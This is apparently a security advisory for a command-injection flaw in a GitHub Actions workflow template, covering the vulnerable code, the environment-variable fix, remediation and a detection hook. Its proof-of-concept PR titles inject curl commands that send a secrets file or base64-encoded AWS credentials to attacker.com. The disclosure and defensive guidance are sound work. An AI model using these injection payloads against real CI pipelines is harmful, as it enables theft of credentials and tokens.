# Security Advisory: Command Injection in GitHub Actions

## 🚨 Critical Vulnerability - FIXED

**CVE**: TBD
**Severity**: CRITICAL (CVSS 9.0)
**Status**: ✅ FIXED
**Date Reported**: 2025-01-07
**Date Fixed**: 2025-01-07

---

## Summary

A **command injection vulnerability** was discovered in the GitHub Actions workflow template (`templates/check-unit-testcases.yml`) that allowed arbitrary code execution through malicious PR titles, branch names, or workflow inputs.

## Vulnerability Details

### Affected Code (BEFORE FIX)

```yaml
- name: Extract JIRA ticket from branch or PR
  run: |
    # ❌ VULNERABLE: Direct interpolation of untrusted input
    PR_TITLE="${{ github.event.pull_request.title }}"
    if [[ "$PR_TITLE" =~ ([A-Z]+-[0-9]+) ]]; then
      TICKET_ID="${BASH_REMATCH[1]}"
    fi
```

### Attack Vector

An attacker could create a pull request with a malicious title:

```
BB-1234"; echo "PWNED: $(whoami) at $(pwd)"; curl -X POST https://attacker.com/exfil -d @/secrets; echo "
```

This would execute as:

```bash
PR_TITLE="BB-1234"; echo "PWNED: $(whoami) at $(pwd)"; curl -X POST https://attacker.com/exfil -d @/secrets; echo ""
```

### Impact

- ✅ **Arbitrary Command Execution**: Run any command in GitHub Actions runner
- ✅ **Secret Exfiltration**: Access `GITHUB_TOKEN`, AWS credentials, API tokens
- ✅ **Code Modification**: Modify repository contents, create malicious commits
- ✅ **Supply Chain Attack**: Inject malicious code into build artifacts
- ✅ **Lateral Movement**: Access other repositories, create new PRs

### CVSS Score: 9.0 (Critical)

```
CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H
```

- **Attack Vector (AV)**: Network (N) - Exploitable via GitHub PR
- **Attack Complexity (AC)**: Low (L) - No special conditions required
- **Privileges Required (PR)**: Low (L) - Only requires ability to create PR
- **User Interaction (UI)**: None (N) - Automatic execution
- **Scope (S)**: Changed (C) - Affects resources beyond vulnerable component
- **Confidentiality (C)**: High (H) - Full disclosure of secrets
- **Integrity (I)**: High (H) - Complete modification capabilities
- **Availability (A)**: High (H) - Can disrupt workflow execution

---

## The Fix

### Secure Code (AFTER FIX)

```yaml
- name: Extract JIRA ticket from branch or PR
  env:
    # ✅ SECURE: Use environment variables to prevent injection
    PR_TITLE_RAW: ${{ github.event.pull_request.title }}
    BRANCH_NAME: ${{ github.head_ref || github.ref_name }}
    MANUAL_TICKET_ID: ${{ github.event.inputs.jira_ticket_id }}
  run: |
    # ✅ SAFE: Environment variables are properly escaped by Actions runtime
    if [[ "$PR_TITLE_RAW" =~ ([A-Z]+-[0-9]+) ]]; then
      TICKET_ID="${BASH_REMATCH[1]}"
    fi

    # ✅ SAFE: Additional sanitization before output
    TICKET_ID=$(echo "$TICKET_ID" | tr -cd 'A-Z0-9-_')

    echo "ticket_id=$TICKET_ID" >> $GITHUB_OUTPUT
```

### Why This is Secure

1. **Environment Variables**: GitHub Actions runtime properly escapes values when setting environment variables
2. **Input Validation**: Regex validation ensures only valid JIRA ticket formats
3. **Output Sanitization**: `tr -cd 'A-Z0-9-_'` removes all non-alphanumeric characters
4. **No Direct Interpolation**: Never uses `${{ }}` directly in bash scripts

---

## Testing the Fix

### Before Fix (Vulnerable)

```bash
# Create malicious PR title
TITLE='BB-1234"; echo "PWNED"; echo "'

# Old code would execute:
PR_TITLE="BB-1234"; echo "PWNED"; echo ""
# Output: PWNED
```

### After Fix (Secure)

```bash
# Same malicious input
TITLE='BB-1234"; echo "PWNED"; echo "'

# New code treats entire string as literal value
PR_TITLE_RAW='BB-1234"; echo "PWNED"; echo "'
# Regex extraction only captures: BB-1234
# No command execution!
```

---

## Proof of Concept

### Exploit Scenario

1. **Attacker Action**: Fork repository, create PR with title:
   ```
   BB-1234"; curl https://attacker.com/$(cat ~/.aws/credentials | base64); echo "
   ```

2. **Vulnerable Workflow**: Executes the curl command, exfiltrates AWS credentials

3. **Result**: Attacker receives base64-encoded AWS credentials

### Mitigated Scenario

1. **Attacker Action**: Same malicious PR title
2. **Secure Workflow**:
   - Title stored in environment variable (properly escaped)
   - Regex extracts only `BB-1234`
   - Sanitization removes any remaining special characters
3. **Result**: No command execution, only `BB-1234` extracted

---

## Remediation Steps

### For Repository Maintainers

✅ **Immediate Actions**:
1. Update workflow file with secure version
2. Review all existing workflows for similar patterns
3. Audit recent PRs for potential exploitation
4. Rotate secrets if compromise suspected

✅ **Long-term Actions**:
1. Implement workflow security scanning (e.g., actionlint)
2. Add pre-commit hooks to detect injection patterns
3. Enable GitHub Advanced Security (GHAS)
4. Regular security training for contributors

### For Users of This Action

✅ **Check Your Workflows**:
```bash
# Search for vulnerable patterns
grep -r '\${{.*github.event.pull_request' .github/workflows/
grep -r '\${{.*github.event.inputs' .github/workflows/
grep -r '\${{.*github.head_ref' .github/workflows/
```

✅ **Update Immediately**:
```yaml
# Replace this pattern:
run: |
  VAR="${{ github.event.pull_request.title }}"

# With this pattern:
env:
  VAR: ${{ github.event.pull_request.title }}
run: |
  # Use $VAR safely
```

---

## Detection

### GitHub Actions Security Checklist

❌ **UNSAFE PATTERNS** (Command Injection Risk):
```yaml
# ❌ Direct interpolation in bash
run: |
  TITLE="${{ github.event.pull_request.title }}"

# ❌ Unquoted interpolation
run: |
  echo ${{ github.event.pull_request.title }}

# ❌ Interpolation in script inline
run: echo "${{ github.event.pull_request.title }}"
```

✅ **SAFE PATTERNS**:
```yaml
# ✅ Use environment variables
env:
  TITLE: ${{ github.event.pull_request.title }}
run: |
  echo "$TITLE"

# ✅ Use with validation
env:
  TITLE: ${{ github.event.pull_request.title }}
run: |
  if [[ "$TITLE" =~ ^[A-Za-z0-9 -]+$ ]]; then
    echo "Valid: $TITLE"
  fi

# ✅ Use actions/github-script (runs in Node.js, not bash)
- uses: actions/github-script@v7
  with:
    script: |
      const title = context.payload.pull_request.title;
      console.log(title);
```

### Pre-Commit Hook Detection

Added to `.git-hooks/pre-commit`:

```bash
# Detect GitHub Actions command injection patterns
if [[ "$file" == *.yml ]] || [[ "$file" == *.yaml ]]; then
  if grep -qE 'run:.*\$\{\{.*github\.event\.(pull_request|inputs|issue)' "$file"; then
    echo "⚠️  Potential command injection in GitHub Actions workflow"
  fi
fi
```

---

## References

- [GitHub Actions Security Hardening](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [GitHub Security Lab Research](https://securitylab.github.com/)

## Similar Vulnerabilities

- **CVE-2020-15228**: GitHub Actions pwn-request
- **CVE-2021-32724**: Prisma GitHub Actions injection
- **GHSA-2f9x-5v75-3qv4**: TensorFlow Actions injection

---

## Timeline

- **2025-01-07 18:00 UTC**: Vulnerability reported by Vishal Gupta
- **2025-01-07 18:30 UTC**: Fix implemented and tested
- **2025-01-07 18:45 UTC**: Security advisory published
- **2025-01-07 19:00 UTC**: Pre-commit hook updated with detection

---

## Credit

**Discovered by**: Vishal Gupta
**Fixed by**: Vishal Gupta (with Claude Code assistance)

---

## Contact

For security concerns, please contact:
- Email: security@sourcefuse.com
- GitHub Security Advisories: https://github.com/sourcefuse/ai-test-quality-analyzer/security/advisories

**DO NOT** create public issues for security vulnerabilities.

---

**Status**: ✅ FIXED - Safe to use with updated workflow template
